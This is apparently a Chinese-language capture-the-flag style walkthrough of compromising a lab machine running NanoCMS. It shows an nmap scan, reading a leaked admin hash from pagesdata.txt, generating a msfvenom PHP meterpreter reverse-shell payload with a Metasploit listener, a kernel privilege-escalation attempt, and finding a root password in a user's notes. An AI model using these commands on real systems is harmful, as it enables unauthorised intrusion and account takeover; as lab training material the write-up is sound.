
# 0X00 环境
攻击机IP：192.168.1.10<br />目标机IP：192.168.1.21


# 0X02 实战
使用NMAP扫描端口
```
nmap -sV -A -p- 192.168.1.21
```
![](https://img-blog.csdnimg.cn/26cd3e5ea9ec4f8cb757edfed3bb359a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ljzhY&originHeight=818&originWidth=1163&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到开放了很多端口，就不一一列举了，看图。

开放了80-HTTP端口当然是要先看看。<br />![](https://img-blog.csdnimg.cn/bb7b3fcd33e6415ea155f01f68585777.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=fLde2&originHeight=444&originWidth=1260&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在浏览网页的过程中发现网站的Blog模块使用的是NanoCMS<br />![](https://img-blog.csdnimg.cn/6c0016303df644798a465c9a5a49a38c.png#crop=0&crop=0&crop=1&crop=1&id=kvzjq&originHeight=100&originWidth=328&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

Nano CMS是一个基于PHP的内容管理系统 （CMS）。“ Nano CMS是您所能找到的最小的CMS。用户界面和功能非常非常简单和非常容易使用。Nano CMS的核心功能是基于文件并且可以执行根本不使用任何数据库，这使得安装起来超级容易。

经过搜索找到有关Nano CMS的漏洞[点击跳转](https://cxsecurity.com/issue/WLB-2009040041)
![](https://img-blog.csdnimg.cn/bdcb303e37864b828cb43d4bdff34d7f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=k2d4Q&originHeight=465&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

所以我们可以尝试在`http://192.168.1.21/~andy/` 后面加上 `/data/pagesdata.txt`
```
http://192.168.1.21/~andy/data/pagesdata.txt
```

![](https://img-blog.csdnimg.cn/efd4add29dbd486dbc4bc25daa15729e.png#crop=0&crop=0&crop=1&crop=1&id=AojRq&originHeight=180&originWidth=1086&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

得到`s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd"`

经过解密得到密码为：`shannon`<br />![](https://img-blog.csdnimg.cn/0c811d9c597343299ed797142f893463.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=kqJu6&originHeight=395&originWidth=1094&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

而且在网站可以看到登录入口<br />![](https://img-blog.csdnimg.cn/a074cb74b5ea4c44a68d2e4230b6f5fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_12,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=rrWdh&originHeight=303&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

尝试使用账号`admin`，密码`shannon`进行登录<br />![](https://img-blog.csdnimg.cn/438caed203af4a9abc17df46113ccf82.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=rYB57&originHeight=826&originWidth=1343&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

登陆成功。

在浏览后台发现可以新建php语言页面<br />![](https://img-blog.csdnimg.cn/b5dfd94a4e3f4197bbab399764433862.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=YGbTa&originHeight=815&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用msfvenom生成php木马，用MSF连接**

使用msfvenom生成PHP木马
```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f raw
```

![](https://img-blog.csdnimg.cn/f2c1068753c54209a34d212fc98c152a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=xxqvi&originHeight=358&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将得到的木马代码复制到网页中并命名为PHP1<br />![](https://img-blog.csdnimg.cn/a2b2cc63ae2544378f48e17d5e6059ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=jt6ae&originHeight=501&originWidth=1057&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

创建成功<br />![](https://img-blog.csdnimg.cn/82812d0342b84ac0a2727d645c3f2b9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=yNSbH&originHeight=294&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

打开msfconsole启动监听
```
root@kali-xmtx:~/桌面#msfconsole                                           --启动MSF
msf6 > use exploit/multi/handler                                           --选择模块
exploit(multi/handler) > set payload php/meterpreter/reverse_tcp           --设置payload
msf6 exploit(multi/handler) > set lhost 192.168.1.10                       --设置IP
msf6 exploit(multi/handler) > set lport 4444                               --设置端口
msf6 exploit(multi/handler) > run                                          --运行
```

![](https://img-blog.csdnimg.cn/e96377e83b7c4cb7ac6081e6041368ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=OFbbZ&originHeight=312&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在网站的Blog中找到PHP1文件，点击该文件。<br />![](https://img-blog.csdnimg.cn/1e99cac590644c92b3d7462b412b4559.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_16,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=k236o&originHeight=332&originWidth=582&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

返回到msfconsole中可以看见成功连接<br />![](https://img-blog.csdnimg.cn/da8b0124de064adea1fbcffc5c2b67a6.png#crop=0&crop=0&crop=1&crop=1&id=KeefJ&originHeight=196&originWidth=1299&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

进入shell报错<br />![](https://img-blog.csdnimg.cn/c3190d5aa30e4043921d6b13c37a8448.png#crop=0&crop=0&crop=1&crop=1&id=lRqVT&originHeight=117&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在这里我换了一台本版较老的kali可以成功<br />![](https://img-blog.csdnimg.cn/17dd8be753a74eaea480bc10146a1e5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=MG5ZU&originHeight=297&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看目标机得详细信息<br />![](https://img-blog.csdnimg.cn/3f0be087fc6b4f99ae324d7469b30d10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=vJfPj&originHeight=212&originWidth=1394&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在Internet上搜索以发现可能适用于Linux内核2.6.23.1-42的特权提升漏洞[点击跳转](https://www.exploit-db.com/exploits/9479)
![](https://img-blog.csdnimg.cn/5279297f443c4a0fa2dc4db5e4a42795.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=pBWcP&originHeight=561&originWidth=1732&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

编译该文件<br />![](https://img-blog.csdnimg.cn/aea06ea2f518467187eed6a48ad8b237.png#crop=0&crop=0&crop=1&crop=1&id=k7vhp&originHeight=154&originWidth=1143&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将编译后得文件上传到靶机中<br />![](https://img-blog.csdnimg.cn/bd10edb31aa24bce998645a06b16d728.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=kVYUH&originHeight=338&originWidth=888&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

赋予执行权限给提权文件然后执行，失败
```
Chmod 777 exploit
```

![](https://img-blog.csdnimg.cn/fa8b5a9a129d4ec4b8d8f661304c8a5e.png#crop=0&crop=0&crop=1&crop=1&id=jxHrb&originHeight=132&originWidth=734&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

进入home目录发现有5个用户<br />![](https://img-blog.csdnimg.cn/0626e3e4b09b4ecdab2b73dc61fc788e.png#crop=0&crop=0&crop=1&crop=1&id=ECsDL&originHeight=151&originWidth=453&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

依次查看，最终在patrick的隐藏目录中发现`.tomboy.log`文件(Tomboy 是一款适用于 Linux、Unix 和 Windows 的桌面笔记应用程序。)
```
cd /patrick
ls -al
```

![](https://img-blog.csdnimg.cn/46f6c88b04d240fc9d5abb740be0b48b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=PFgGX&originHeight=832&originWidth=755&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看 .tomboy.log文件，可以看到用户保存过root的密码
```
cat .tomboy.log
```

![](https://img-blog.csdnimg.cn/d85183a9bd1c4bc89cb0cc574be65807.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=QhUNP&originHeight=273&originWidth=1084&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

进入.tombody文件查看笔记，成功发现root密码<br />![](https://img-blog.csdnimg.cn/1e82207d1ce84aa49fe8b398fa07194f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=cdrTz&originHeight=662&originWidth=1345&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

SSH远程链接<br />![](https://img-blog.csdnimg.cn/de50864dda6f4c97b76bc71f88977f98.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Ci3PC&originHeight=215&originWidth=845&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
